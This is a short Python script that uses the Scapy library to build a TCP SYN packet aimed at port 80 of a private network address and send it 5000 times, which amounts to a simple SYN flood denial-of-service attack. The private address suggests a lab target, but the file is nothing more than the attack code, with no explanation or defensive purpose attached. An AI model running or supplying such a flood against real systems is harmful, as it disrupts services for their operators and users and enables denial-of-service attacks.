from scapy.all import send, IP, TCP

target_ip = "192.168.111.129"
target_port = 80 
packet = IP(dst=target_ip)/TCP(dport=target_port, flags='S')

send(packet, count=5000, verbose=False) 
